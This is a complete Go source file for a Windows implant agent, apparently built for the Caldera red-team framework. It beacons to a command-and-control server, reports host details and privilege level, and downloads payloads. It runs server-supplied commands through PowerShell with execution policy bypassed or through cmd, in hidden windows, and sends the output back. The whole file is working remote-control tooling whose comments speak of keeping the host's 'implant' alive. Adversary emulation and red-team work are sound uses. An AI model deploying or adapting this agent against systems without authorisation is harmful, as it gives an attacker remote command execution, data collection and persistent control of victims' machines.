//go:build windows

package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	rdebug "runtime/debug"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Changed from environment variable to a command-line flag.
var debug bool

// dprintf prints debug messages if the -debug flag is enabled.
func dprintf(format string, a ...interface{}) {
	if debug {
		fmt.Printf(format+"\n", a...)
	}
}

type Instruction struct {
	ID            string   `json:"id"`
	Sleep         int      `json:"sleep"`
	Command       string   `json:"command"`
	Executor      string   `json:"executor"`
	Timeout       int      `json:"timeout"`
	Payloads      []string `json:"payloads"`
	Uploads       []string `json:"uploads"`
	Deadman       bool     `json:"deadman"`
	DeletePayload bool     `json:"delete_payload"`
}

func (inst *Instruction) UnmarshalJSON(data []byte) error {
	type Alias Instruction
	aux := &struct {
		Deadman       interface{} `json:"deadman"`
		DeletePayload interface{} `json:"delete_payload"`
		*Alias
	}{
		Alias: (*Alias)(inst),
	}

	if err := json.Unmarshal(data, &aux); err != nil {
		return err
	}

	inst.Deadman = parseBoolField(aux.Deadman)
	inst.DeletePayload = parseBoolField(aux.DeletePayload)
	return nil
}

func parseBoolField(val interface{}) bool {
	switch v := val.(type) {
	case bool:
		return v
	case string:
		return v == "true" || v == "1" || v == "True" || v == "TRUE"
	case float64:
		return v != 0
	default:
		return false
	}
}

type BeaconResponse struct {
	Paw          string        `json:"paw"`
	Sleep        int           `json:"sleep"`
	Watchdog     int           `json:"watchdog"`
	Instructions []Instruction `json:"instructions"`
}

type ExecutionResult struct {
	ID       string `json:"id"`
	Output   string `json:"output"`
	Stderr   string `json:"stderr"`
	ExitCode int    `json:"exit_code"`
	Status   int    `json:"status"`
	PID      int    `json:"pid"`
}

type BeaconResult struct {
	Paw     string            `json:"paw"`
	Results []ExecutionResult `json:"results"`
}

var (
	insecureTLS  = false
	httpClient   *http.Client
	httpClientMu sync.Mutex
)

const (
	httpRequestTimeout       = 120 * time.Second
	httpDialTimeout          = 10 * time.Second
	httpTLSHandshakeTimeout  = 10 * time.Second
	httpResponseHeaderTimout = 60 * time.Second
	httpIdleConnTimeout      = 90 * time.Second
	// Per-stream output cap. Tuned high so legitimate large outputs
	// (file dumps, recursive listings, captured EDR logs etc.) are not
	// truncated. Beyond this the truncation marker kicks in.
	maxCapturedOutputBytes = 64 << 20 // 64 MiB per stdout / stderr stream
	reconnectBaseDelay     = 5 * time.Second
	reconnectMaxDelay      = 60 * time.Second
	defaultMaxTimeout      = 10 * time.Minute
	// Payload download from server. Some atomic abilities ship tens of MB
	// of binaries — keep this generous so they fit without question.
	maxPayloadBytes        = 1 << 30 // 1 GiB
	maxBeaconResponseBytes = 256 << 20 // 256 MiB cap on beacon response body
	maxDrainBytes          = 4 << 20   // 4 MiB cap when draining unused response bodies
)

// recoverAsError converts a panic into a returned error. Used to keep the
// beacon loop alive across unexpected bugs anywhere in the call stack —
// without this, a panic in JSON parsing / type assertion / etc. would crash
// the entire agent process and the host loses its implant.
func recoverAsError(where string, errp *error) {
	if r := recover(); r != nil {
		*errp = fmt.Errorf("%s panic: %v\n%s", where, r, strings.TrimSpace(string(rdebug.Stack())))
	}
}

// getStringField / getIntField replace direct “raw["key"].(string)“ casts,
// which panic on type mismatch and bring the whole agent down with them.
func getStringField(raw map[string]interface{}, key string) (string, error) {
	val, ok := raw[key]
	if !ok {
		return "", fmt.Errorf("missing %q field", key)
	}
	out, ok := val.(string)
	if !ok {
		return "", fmt.Errorf("%q field is %T, want string", key, val)
	}
	return out, nil
}

func getIntField(raw map[string]interface{}, key string) (int, error) {
	val, ok := raw[key]
	if !ok {
		return 0, fmt.Errorf("missing %q field", key)
	}
	switch v := val.(type) {
	case float64:
		return int(v), nil
	case int:
		return v, nil
	default:
		return 0, fmt.Errorf("%q field is %T, want numeric", key, val)
	}
}

// reconnectDelay implements exponential backoff capped at reconnectMaxDelay so
// a wedged C2 can't make the agent retry-storm.
func reconnectDelay(failures int) time.Duration {
	if failures <= 0 {
		return reconnectBaseDelay
	}
	delay := reconnectBaseDelay
	for i := 1; i < failures; i++ {
		delay *= 2
		if delay >= reconnectMaxDelay {
			return reconnectMaxDelay
		}
	}
	return delay
}

// suppressErrorDialogs sets the process error mode so Windows does NOT pop a
// modal dialog when a child process (e.g. rundll32 loading a missing DLL)
// hits a critical error. The mode is inherited by child processes, so
// powershell.exe, cmd.exe, rundll32.exe, regsvr32.exe etc. all fail fast
// with an exit code instead of hanging on a dialog the non-interactive
// agent can never dismiss.
func suppressErrorDialogs() {
	const (
		SEM_FAILCRITICALERRORS = 0x0001
		SEM_NOGPFAULTERRORBOX  = 0x0002
		SEM_NOOPENFILEERRORBOX = 0x8000
	)
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	setErrorMode := kernel32.NewProc("SetErrorMode")
	setErrorMode.Call(uintptr(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX))
}

func parseInstructions(raw interface{}) ([]Instruction, error) {
	var list []Instruction

	rawStr, ok := raw.(string)
	if !ok {
		return nil, fmt.Errorf("instructions field is not a string")
	}

	var jsonStrings []string
	if err := json.Unmarshal([]byte(rawStr), &jsonStrings); err != nil {
		return nil, fmt.Errorf("nested unmarshal failed: %v", err)
	}

	for _, s := range jsonStrings {
		dprintf("[DEBUG] Raw instruction JSON: %s", s)
		var inst Instruction
		if err := json.Unmarshal([]byte(s), &inst); err != nil {
			fmt.Printf("[ERROR] could not unmarshal instruction: %v\n", err)
			fmt.Printf("[ERROR] Problematic JSON: %s\n", s)
			continue
		}
		list = append(list, inst)
	}
	return list, nil
}

// getHTTPClient returns a single shared *http.Client. Creating a fresh client
// per beacon (the previous behaviour) defeated connection-pool reuse and
// added avoidable allocations.
func getHTTPClient() *http.Client {
	httpClientMu.Lock()
	defer httpClientMu.Unlock()

	if httpClient != nil {
		return httpClient
	}

	transport := &http.Transport{
		Proxy: http.ProxyFromEnvironment,
		DialContext: (&net.Dialer{
			Timeout:   httpDialTimeout,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		ForceAttemptHTTP2:     true,
		MaxIdleConns:          10,
		MaxIdleConnsPerHost:   4,
		IdleConnTimeout:       httpIdleConnTimeout,
		TLSHandshakeTimeout:   httpTLSHandshakeTimeout,
		ResponseHeaderTimeout: httpResponseHeaderTimout,
		ExpectContinueTimeout: 1 * time.Second,
		TLSClientConfig:       &tls.Config{InsecureSkipVerify: insecureTLS},
	}

	httpClient = &http.Client{
		Timeout:   httpRequestTimeout,
		Transport: transport,
	}
	return httpClient
}

// drainAndClose drains a bounded amount of the body and closes it. Without
// this, Go pins the underlying TCP connection in the active state and never
// returns it to the pool — exhausts sockets / file descriptors over time.
func drainAndClose(resp *http.Response) {
	if resp == nil || resp.Body == nil {
		return
	}
	_, _ = io.Copy(io.Discard, io.LimitReader(resp.Body, maxDrainBytes))
	_ = resp.Body.Close()
}

func postEncodedBeacon(server, encoded string) (*http.Response, error) {
	dprintf("[DEBUG] POST %s/beacon", server)
	return getHTTPClient().Post(server+"/beacon", "text/plain", bytes.NewBuffer([]byte(encoded)))
}

func sendResults(server, paw string, results []ExecutionResult) error {
	jsonResults, err := json.Marshal(BeaconResult{Paw: paw, Results: results})
	if err != nil {
		return fmt.Errorf("marshal results: %w", err)
	}

	encoded := base64.StdEncoding.EncodeToString(jsonResults)
	dprintf("[DEBUG] Result post start: paw=%s count=%d", paw, len(results))

	resp, err := postEncodedBeacon(server, encoded)
	if err != nil {
		return err
	}
	defer drainAndClose(resp)

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("result post HTTP %d", resp.StatusCode)
	}

	dprintf("[DEBUG] Result post end: paw=%s count=%d", paw, len(results))
	return nil
}

func sendBeacon(server string, data map[string]interface{}) (_ *BeaconResponse, err error) {
	defer recoverAsError("sendBeacon", &err)

	dprintf("[DEBUG] Beacon request start: %s/beacon", server)

	jsonData, _ := json.Marshal(data)
	encoded := base64.StdEncoding.EncodeToString(jsonData)

	resp, err := postEncodedBeacon(server, encoded)
	if err != nil {
		return nil, err
	}
	defer drainAndClose(resp)

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("unexpected HTTP status: %d", resp.StatusCode)
	}

	body, err := io.ReadAll(io.LimitReader(resp.Body, maxBeaconResponseBytes))
	if err != nil {
		return nil, fmt.Errorf("read beacon body failed: %v", err)
	}
	if len(body) == 0 {
		return nil, fmt.Errorf("empty body from server")
	}

	decoded, err := base64.StdEncoding.DecodeString(string(body))
	if err != nil {
		return nil, fmt.Errorf("base64 decode failed: %v", err)
	}

	dprintf("[DEBUG] Server response: %s", string(decoded))

	var raw map[string]interface{}
	if err := json.Unmarshal(decoded, &raw); err != nil {
		return nil, fmt.Errorf("json unmarshal failed: %v", err)
	}

	var br BeaconResponse
	if br.Paw, err = getStringField(raw, "paw"); err != nil {
		return nil, err
	}
	if br.Sleep, err = getIntField(raw, "sleep"); err != nil {
		return nil, err
	}
	if br.Watchdog, err = getIntField(raw, "watchdog"); err != nil {
		return nil, err
	}

	instructions, err := parseInstructions(raw["instructions"])
	if err != nil {
		return nil, err
	}
	br.Instructions = instructions

	dprintf("[DEBUG] Beacon response parsed: paw=%s sleep=%d watchdog=%d tasks=%d",
		br.Paw, br.Sleep, br.Watchdog, len(br.Instructions))

	return &br, nil
}

func downloadPayload(server, name string) error {
	url := server + "/file/download"
	req, err := http.NewRequest("POST", url, nil)
	if err != nil {
		return err
	}
	req.Header.Set("file", name)
	dprintf("[DEBUG] Payload download start: %s", name)

	resp, err := getHTTPClient().Do(req)
	if err != nil {
		return err
	}
	defer drainAndClose(resp)

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("payload download HTTP %d", resp.StatusCode)
	}

	// Cap the download to prevent OOM from a hostile / oversized response.
	data, err := io.ReadAll(io.LimitReader(resp.Body, maxPayloadBytes))
	if err != nil {
		return err
	}
	// Sanitize filename — prevents the server from writing to arbitrary paths
	// via a malicious name like "..\\..\\Windows\\System32\\bad.exe".
	safeName := filepath.Base(name)
	if err := os.WriteFile(safeName, data, 0755); err != nil {
		return err
	}
	dprintf("[DEBUG] Payload download end: %s (%d bytes)", safeName, len(data))
	return nil
}

func isElevated() bool {
	var token windows.Token
	proc, err := windows.GetCurrentProcess()
	if err != nil {
		return false
	}

	err = windows.OpenProcessToken(proc, windows.TOKEN_QUERY, &token)
	if err != nil {
		return false
	}
	defer token.Close()

	var elevation uint32
	var returnedLen uint32
	err = windows.GetTokenInformation(token, windows.TokenElevation, (*byte)(unsafe.Pointer(&elevation)), uint32(unsafe.Sizeof(elevation)), &returnedLen)
	if err != nil {
		return false
	}

	return elevation != 0
}

// killProcessTree kills the entire process tree rooted at pid using taskkill.
// On Windows, killing only the leader (Go's default) leaves orphaned children
// like rundll32 hanging on dialogs or holding handles. taskkill /T forces a
// recursive kill.
func killProcessTree(pid int) {
	if pid <= 0 {
		return
	}
	cmd := exec.Command("taskkill", "/T", "/F", "/PID", strconv.Itoa(pid))
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_ = cmd.Run()
}

// createCaptureFile returns a tempfile suitable for capturing stdout/stderr.
// Writing to a file (instead of an in-memory bytes.Buffer) means commands
// emitting unexpectedly large output cannot OOM the agent process; we read
// back a capped portion afterwards.
func createCaptureFile(prefix string) (*os.File, error) {
	return os.CreateTemp("", prefix)
}

// readCappedFile reads up to “limit“ bytes from path. If the file is larger,
// the returned data has a "[output truncated...]" marker appended.
func readCappedFile(path string, limit int64) ([]byte, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	info, err := file.Stat()
	if err != nil {
		return nil, err
	}

	var buf bytes.Buffer
	if _, err := io.CopyN(&buf, file, limit+1); err != nil && err != io.EOF {
		return nil, err
	}

	data := buf.Bytes()
	truncated := info.Size() > limit || int64(len(data)) > limit
	if int64(len(data)) > limit {
		data = data[:limit]
	}
	if truncated {
		data = append(data, []byte(fmt.Sprintf("\n[output truncated after %d bytes]", limit))...)
	}
	return data, nil
}

func runInstruction(parent context.Context, inst Instruction) (out ExecutionResult) {
	out = ExecutionResult{ID: inst.ID}

	// Per-instruction panic recovery — one rogue command must never crash
	// the whole agent. Convert any panic into a failed result instead.
	defer func() {
		if r := recover(); r != nil {
			msg := fmt.Sprintf("runInstruction panic: %v\n%s", r, strings.TrimSpace(string(rdebug.Stack())))
			out.Stderr = base64.StdEncoding.EncodeToString([]byte(msg))
			out.ExitCode = 1
			out.Status = 1
		}
	}()

	cmdBytes, err := base64.StdEncoding.DecodeString(inst.Command)
	if err != nil {
		out.Stderr = base64.StdEncoding.EncodeToString([]byte(err.Error()))
		out.ExitCode = 1
		return out
	}

	dprintf("[DEBUG] Command start: id=%s timeout=%d executor=%s", inst.ID, inst.Timeout, inst.Executor)
	dprintf("[DEBUG] Exec: %s", string(cmdBytes))

	if parent == nil {
		parent = context.Background()
	}

	ctx := parent
	var cancel context.CancelFunc
	if inst.Timeout > 0 {
		ctx, cancel = context.WithTimeout(ctx, time.Duration(inst.Timeout)*time.Second)
	} else {
		// Always enforce a ceiling so no command can hang forever — server
		// can still set inst.Timeout if it wants longer.
		ctx, cancel = context.WithTimeout(ctx, defaultMaxTimeout)
	}

	var cmd *exec.Cmd
	switch inst.Executor {
	case "psh":
		cmd = exec.CommandContext(ctx, "powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", string(cmdBytes))
	case "pwsh":
		cmd = exec.CommandContext(ctx, "pwsh.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", string(cmdBytes))
	case "cmd":
		cmd = exec.CommandContext(ctx, "cmd.exe", "/c", string(cmdBytes))
	default:
		cancel()
		err := fmt.Errorf("unsupported executor: %s. Use one of [cmd, psh, pwsh]", inst.Executor)
		out.Stderr = base64.StdEncoding.EncodeToString([]byte(err.Error()))
		out.ExitCode = 1
		return out
	}

	cmd.SysProcAttr = &syscall.SysProcAttr{
		CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP,
		HideWindow:    true,
	}

	// Capture stdout/stderr to tempfiles, not in-memory buffers — a command
	// that prints multiple gigabytes (intentionally or by bug) cannot OOM
	// the agent now; we read back a bounded amount after the process exits.
	stdoutFile, err := createCaptureFile("caldera-stdout-*")
	if err != nil {
		cancel()
		out.Stderr = base64.StdEncoding.EncodeToString([]byte(err.Error()))
		out.ExitCode = 1
		return out
	}
	defer func() {
		_ = os.Remove(stdoutFile.Name())
	}()

	stderrFile, err := createCaptureFile("caldera-stderr-*")
	if err != nil {
		cancel()
		_ = stdoutFile.Close()
		out.Stderr = base64.StdEncoding.EncodeToString([]byte(err.Error()))
		out.ExitCode = 1
		return out
	}
	defer func() {
		_ = os.Remove(stderrFile.Name())
	}()

	cmd.Stdout = stdoutFile
	cmd.Stderr = stderrFile

	if err := cmd.Start(); err != nil {
		cancel()
		_ = stdoutFile.Close()
		_ = stderrFile.Close()
		out.Stderr = base64.StdEncoding.EncodeToString([]byte(err.Error()))
		out.ExitCode = 1
		return out
	}

	// When the context expires, kill the entire process tree — not just the
	// leader. taskkill /T /F handles e.g. powershell → rundll32 chains so a
	// stuck grandchild can't keep holding resources after the timeout fires.
	done := make(chan struct{})
	go func(pid int) {
		select {
		case <-done:
			return
		case <-ctx.Done():
		}
		if ctx.Err() == nil {
			return
		}
		dprintf("[DEBUG] Context ended for id=%s pid=%d (%v), killing process tree", inst.ID, pid, ctx.Err())
		killProcessTree(pid)
	}(cmd.Process.Pid)

	waitErr := cmd.Wait()
	close(done)
	ctxErr := ctx.Err()
	cancel()
	_ = stdoutFile.Close()
	_ = stderrFile.Close()

	blocked := 0
	exitCode := 0

	if waitErr != nil {
		if ctxErr == context.DeadlineExceeded {
			exitCode = 124
			blocked = 1
		} else if ctxErr == context.Canceled {
			exitCode = 130
			blocked = 1
		} else if exitErr, ok := waitErr.(*exec.ExitError); ok {
			exitCode = exitErr.ExitCode()
		} else {
			blocked = 1
			exitCode = 1
		}
	}

	stdoutBytes, err := readCappedFile(stdoutFile.Name(), maxCapturedOutputBytes)
	if err != nil {
		stdoutBytes = []byte{}
		dprintf("[DEBUG] stdout read failed for id=%s: %v", inst.ID, err)
	}
	stderrBytes, err := readCappedFile(stderrFile.Name(), maxCapturedOutputBytes)
	if err != nil {
		stderrBytes = append(stderrBytes, []byte(fmt.Sprintf("\nstderr read failed: %v", err))...)
		dprintf("[DEBUG] stderr read failed for id=%s: %v", inst.ID, err)
	}

	out.Output = base64.StdEncoding.EncodeToString(stdoutBytes)
	out.Stderr = base64.StdEncoding.EncodeToString(stderrBytes)
	out.ExitCode = exitCode
	out.Status = blocked
	if cmd.ProcessState != nil {
		out.PID = cmd.ProcessState.Pid()
	}

	dprintf("[DEBUG] Command end: id=%s pid=%d exit=%d blocked=%d", out.ID, out.PID, out.ExitCode, out.Status)

	return out
}

func buildAgentProfile() map[string]interface{} {
	hostname, _ := os.Hostname()
	var ipList []string
	ifaces, _ := net.Interfaces()
	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}
		addrs, _ := iface.Addrs()
		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}
			if ip == nil || ip.IsLoopback() {
				continue
			}
			if ipv4 := ip.To4(); ipv4 != nil {
				ipList = append(ipList, ipv4.String())
			}
		}
	}

	privilege := "User"
	if isElevated() {
		privilege = "Elevated"
	}

	return map[string]interface{}{
		"platform":        runtime.GOOS,
		"host":            hostname,
		"display_name":    hostname,
		"group":           "red",
		"username":        os.Getenv("USERNAME"),
		"architecture":    runtime.GOARCH,
		"executors":       []string{"cmd", "psh", "pwsh"},
		"privilege":       privilege,
		"pid":             os.Getpid(),
		"ppid":            os.Getppid(),
		"location":        os.Args[0],
		"exe_name":        os.Args[0],
		"host_ip_addrs":   ipList,
		"deadman_enabled": true,
	}
}

func run() (err error) {
	defer recoverAsError("main", &err)

	serverURL := flag.String("server", "", "C2 server URL (e.g., http://127.0.0.1:8888)")
	insecureFlag := flag.Bool("insecure", false, "Disable TLS certificate verification")
	debugFlag := flag.Bool("debug", false, "Enable verbose debug output")
	flag.Parse()

	if *serverURL == "" {
		fmt.Println("Error: -server flag is required.")
		flag.Usage()
		return fmt.Errorf("missing -server argument")
	}

	debug = *debugFlag
	insecureTLS = *insecureFlag
	server := *serverURL

	if insecureTLS {
		fmt.Println("[WARN] TLS certificate verification is disabled")
	}
	if debug {
		fmt.Println("[INFO] Debug mode is enabled")
	}

	// Suppress Windows error dialogs before doing anything else — child
	// processes inherit this mode, so rundll32 / regsvr32 / mshta failures
	// will return an error code instead of hanging on a modal dialog the
	// non-interactive agent can never dismiss.
	suppressErrorDialogs()

	agent := buildAgentProfile()

	consecutiveFailures := 0
	agentCtx, agentCancel := context.WithCancel(context.Background())
	defer agentCancel()

	for {
		resp, err := sendBeacon(server, agent)
		if err != nil {
			consecutiveFailures++
			delay := reconnectDelay(consecutiveFailures)
			fmt.Println("[ERROR] beacon:", err)
			dprintf("[DEBUG] Beacon failure count=%d backoff=%s", consecutiveFailures, delay)
			time.Sleep(delay)
			continue
		}
		consecutiveFailures = 0
		dprintf("[DEBUG] Beacon OK – paw=%s, tasks=%d", resp.Paw, len(resp.Instructions))

		agent["paw"] = resp.Paw

		// Execute each instruction and send its result one-at-a-time so we
		// never build up a payload that exceeds the server's max body size.
		for _, inst := range resp.Instructions {
			// Per-instruction panic isolation lives inside runInstruction; if
			// payload download fails, we still attempt to run the command
			// (the server already counts the link as delivered).
			for _, p := range inst.Payloads {
				if err := downloadPayload(server, p); err != nil {
					fmt.Println("[ERROR] payload:", err)
				}
			}

			res := runInstruction(agentCtx, inst)

			if err := sendResults(server, resp.Paw, []ExecutionResult{res}); err != nil {
				fmt.Println("[ERROR] send result:", err)
				// Don't break — keep executing remaining instructions so they
				// aren't lost (server already marked them as collected).
			}

			if inst.DeletePayload {
				for _, p := range inst.Payloads {
					if err := os.Remove(filepath.Base(p)); err == nil {
						dprintf("[DEBUG] Payload removed: %s", p)
					}
				}
			}

			if inst.Sleep > 0 {
				time.Sleep(time.Duration(inst.Sleep) * time.Second)
			}
		}

		time.Sleep(time.Duration(resp.Sleep) * time.Second)
	}
}

func main() {
	if err := run(); err != nil {
		fmt.Println("[ERROR]", err)
		os.Exit(1)
	}
}
